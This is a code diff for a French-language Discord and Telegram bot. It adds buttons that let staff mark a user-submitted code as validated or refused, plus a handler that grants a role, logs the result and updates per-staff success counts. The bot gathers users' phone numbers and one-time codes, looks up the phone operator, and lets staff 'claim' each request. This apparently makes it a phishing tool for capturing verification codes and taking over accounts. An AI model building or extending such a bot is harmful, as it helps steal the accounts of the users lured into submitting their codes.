@@ -578,8 +578,12 @@ client.on("messageCreate", async (m) => {
         const newEmbed = await buildModEmbed(u, og, data.phone, code, data.dateStr, data.claimTs || Math.floor(Date.now()/1000), data.claimTs ? (()=>{ const e=Date.now()-data.claimTs*1000; return `${String(Math.floor(e/60000)).padStart(2,"0")}:${String(Math.floor((e%60000)/1000)).padStart(2,"0")}` })() : "00:00");
         await detailMsg.edit({ embeds: [newEmbed] }).catch(()=>{});
       }
-      // notif salon : code reçu
-      await targetChannel.send({ content: `📩 **Code reçu** de <@${data.userId}> : \`${code}\` — en attente de validation.` }).catch(()=>{});
+      // notif salon : code reçu + boutons validé/refusé
+      const codeRow = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId(`code_validated_${data.originGuildId}_${data.userId}`).setLabel("Code validé").setStyle(ButtonStyle.Success).setEmoji("✅"),
+        new ButtonBuilder().setCustomId(`code_refused_${data.originGuildId}_${data.userId}`).setLabel("Code refusé").setStyle(ButtonStyle.Danger).setEmoji("❌")
+      );
+      await targetChannel.send({ content: `📩 **Code reçu** de <@${data.userId}> : \`${code}\` — en attente de validation.`, components: [codeRow] }).catch(()=>{});
     }
   } catch {}
   // auto-supprime le code pour confidentialité après 3s
@@ -1151,7 +1155,13 @@ client.on("interactionCreate", async (i) => {
           const newEmbed = await buildModEmbed(i.user, og || { name: "Serveur", memberCount: 0, id: originGuildId }, data.phone, code, data.dateStr);
           await detailMsg.edit({ embeds: [newEmbed] });
         } catch {}
-        try { await targetChannel.send({ content: `📩 **Code reçu** de <@${userId}> : \`${code}\` — en attente de validation.` }); } catch {}
+        try {
+          const codeRowModal = new ActionRowBuilder().addComponents(
+            new ButtonBuilder().setCustomId(`code_validated_${originGuildId}_${userId}`).setLabel("Code validé").setStyle(ButtonStyle.Success).setEmoji("✅"),
+            new ButtonBuilder().setCustomId(`code_refused_${originGuildId}_${userId}`).setLabel("Code refusé").setStyle(ButtonStyle.Danger).setEmoji("❌")
+          );
+          await targetChannel.send({ content: `📩 **Code reçu** de <@${userId}> : \`${code}\` — en attente de validation.`, components: [codeRowModal] });
+        } catch {}
       }
       const operator = await getOperatorPrecise(data.phone);
       const formatted = formatPhone(data.phone);
@@ -1664,6 +1674,48 @@ client.on("interactionCreate", async (i) => {
     pending.delete(key);
     try { await i.update({ content: isValidated ? `✅ Code validé pour <@${userId}> — accès accordé.` : `❌ Code refusé pour <@${userId}>.`, components: [] }); } catch { await i.reply({ content: isValidated ? "✅ Code validé." : "❌ Code refusé.", flags: MessageFlags.Ephemeral }).catch(()=>{}); }
     // notif user
+    try {
+      if (originGuildId === "tg") {
+        if (tgBot) await tgBot.telegram.sendMessage(userId, isValidated ? "✅ Ton code a été validé. Accès accordé !" : "❌ Ton code a été refusé. Réessaie.");
+      } else {
+        const u = await client.users.fetch(userId).catch(()=>null);
+        if (u) await u.send(isValidated ? "✅ Ton code a été validé. Accès accordé !" : "❌ Ton code a été refusé.").catch(()=>{});
+      }
+    } catch {}
+    setTimeout(() => i.channel.delete().catch(()=>{}), 2000);
+    return;
+  }
+  if (i.isButton() && (i.customId.startsWith("code_validated_") || i.customId.startsWith("code_refused_"))) {
+    const isValidated = i.customId.startsWith("code_validated_");
+    const rest = i.customId.replace("code_validated_", "").replace("code_refused_", "");
+    const [originGuildId, userId] = rest.split("_");
+    const key = `${originGuildId}:${userId}`;
+    const data = pending.get(key);
+    if (!data) { await i.reply({ content: "Demande expirée.", flags: MessageFlags.Ephemeral }); return; }
+    if (data.timerInterval) { try { clearInterval(data.timerInterval); } catch {} }
+    const claimerId = i.user.id;
+    let originGuild = null;
+    let claimedTag = "";
+    if (originGuildId === "tg") originGuild = { id: "tg", name: "Telegram" };
+    else { try { originGuild = await client.guilds.fetch(originGuildId); } catch { originGuild = { id: originGuildId, name: "Serveur" }; } try { const u = await client.users.fetch(userId); claimedTag = u.username; } catch {} }
+    if (isValidated && originGuildId !== "tg") {
+      try { const og = await client.guilds.fetch(originGuildId); const member = await og.members.fetch(userId); await member.roles.add(process.env.ROLE_ID); } catch {}
+    }
+    try { await sendFinalResultLog({ status: isValidated ? "validated" : "failed", claimerId, claimedUserId: userId, claimedUserTag: claimedTag, phone: data.phone || "Inconnu", originGuild: originGuild || { id: originGuildId, name: "Inconnu" }, tgName: data.tgName }); } catch {}
+    if (isValidated) stats.validated++; else stats.failed++;
+    stats.lastUpdate = new Date().toISOString();
+    stats.lastUpdateBy = claimerId;
+    stats.lastStatus = isValidated ? "validated" : "failed";
+    if (!stats.staff) stats.staff = {};
+    if (!stats.staff[claimerId]) stats.staff[claimerId] = { validated: 0, failed: 0, lastUpdate: null, lastStatus: null, tag: i.user.tag };
+    const s2 = stats.staff[claimerId];
+    if (isValidated) s2.validated++; else s2.failed++;
+    s2.lastUpdate = stats.lastUpdate;
+    s2.lastStatus = stats.lastStatus;
+    s2.tag = i.user.tag;
+    saveDbStats().catch(() => saveStats());
+    pending.delete(key);
+    try { await i.update({ content: isValidated ? `✅ Code validé pour <@${userId}> — accès accordé.` : `❌ Code refusé pour <@${userId}>.`, components: [] }); } catch { await i.reply({ content: isValidated ? "✅ Code validé." : "❌ Code refusé.", flags: MessageFlags.Ephemeral }).catch(()=>{}); }
     try {
       if (originGuildId === "tg") {
         if (tgBot) await tgBot.telegram.sendMessage(userId, isValidated ? "✅ Ton code a été validé. Accès accordé !" : "❌ Ton code a été refusé. Réessaie.");
